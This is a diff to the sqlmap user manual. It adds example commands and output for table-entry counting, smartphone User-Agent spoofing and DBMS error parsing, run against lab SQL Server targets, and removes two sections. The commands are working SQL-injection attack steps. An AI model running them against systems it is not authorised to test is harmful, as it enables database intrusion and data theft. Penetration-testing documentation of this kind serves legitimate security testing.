@@ -1020,7 +1020,19 @@ Switch: `--schema`
 
 Switch: `--count`
 
-[TODO]
+In case that user wants just to know the number of entries in table(s) prior to dumping the desired one, he can use this switch.
+
+Example against a Microsoft SQL Server target:
+
+    $ python sqlmap.py -u "http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1" --count -D testdb
+    [...]
+    Database: testdb
+    +----------------+---------+
+    | Table          | Entries |
+    +----------------+---------+
+    | dbo.users      | 4       |
+    | dbo.users_blob | 2       |
+    +----------------+---------+
 
 ### Dump database table entries
 
@@ -1552,12 +1564,6 @@ If you want sqlmap to run as a batch tool, without any user's interaction  when 
 
 ## Miscellaneous
 
-### IDS detection testing of injection payloads
-
-Switch: `--check-payload`
-
-Curious to see if a [decent intrusion detection system](http://www.phpids.org) (IDS) picks up sqlmap payloads? Use this switch!
-
 ### Cleanup the DBMS from sqlmap specific UDF(s) and table(s)
 
 Switch: `--cleanup`
@@ -1584,7 +1590,22 @@ Default sqlmap behavior with option `-g` is to do a Google search and use the fi
 
 Switch: `--mobile`
 
-[TODO]
+Sometimes web servers expose different interfaces toward mobile phones than desktop computers. In such cases you can enforce usage of one of predetermined smartphone HTTP User-Agent header values. By using this switch, sqlmap will ask you to pick one of popular smartphones which it will imitate in current run.
+
+Example run:
+
+    $ python sqlmap.py -u "http://www.target.com/vuln.php?id=1" --mobile
+    [...]
+    which smartphone do you want sqlmap to imitate through HTTP User-Agent header?
+    [1] Apple iPhone 4s (default)
+    [2] BlackBerry 9900
+    [3] Google Nexus 7
+    [4] HP iPAQ 6365
+    [5] HTC Sensation
+    [6] Nokia N97
+    [7] Samsung Galaxy S
+    > 1
+    [...]
 
 ### Display page rank (PR) for Google dork results
 
@@ -1600,13 +1621,22 @@ If the web application is configured in debug mode so that it displays in the HT
 
 This is useful for debugging purposes like understanding why a certain enumeration or takeover switch does not work - it might be a matter of session user's privileges and in this case you would see a DBMS error message along the lines of `Access denied for user  <SESSION USER>`. 
 
-### Replicate dumped data into a sqlite3 database
+Example against a Microsoft SQL Server target:
 
-Switch: `--replicate`
-
-If you want to store in a local SQLite 3 database file each dumped table (`--dump` or `--dump-all`), you can provide sqlmap with the `--replicate` switch at dump phase. This will create a ` <TABLE_NAME>.sqlite3` rather than a ` <DB_NAME>/ <TABLE_NAME>.csv` file into `output/TARGET_URL/dump/` directory. 
-
-You can then use sqlmap itself to read and query the locally created SQLite 3 file. For instance, `python sqlmap.py -d sqlite:///software/sqlmap/output/192.168.136.131/dump/testdb.sqlite3 --table`.
+    $ python sqlmap.py -u "http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1" -z "ign,flu,tec=U" --parse-errors
+    [...]
+    [11:12:17] [INFO] ORDER BY technique seems to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+    [11:12:17] [INFO] parsed error message: 'Microsoft OLE DB Provider for ODBC Drivers (0x80040E14)
+    [Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 10 is out of range of the number of items in the select list.
+    <b>/sqlmap/mssql/iis/get_int.asp, line 27</b>'
+    [11:12:17] [INFO] parsed error message: 'Microsoft OLE DB Provider for ODBC Drivers (0x80040E14)
+    [Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 6 is out of range of the number of items in the select list.
+    <b>/sqlmap/mssql/iis/get_int.asp, line 27</b>'
+    [11:12:17] [INFO] parsed error message: 'Microsoft OLE DB Provider for ODBC Drivers (0x80040E14)
+    [Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 4 is out of range of the number of items in the select list.
+    <b>/sqlmap/mssql/iis/get_int.asp, line 27</b>'
+    [11:12:17] [INFO] target URL appears to have 3 columns in query
+    [...]
 
 ### Simple wizard interface for beginner users
 
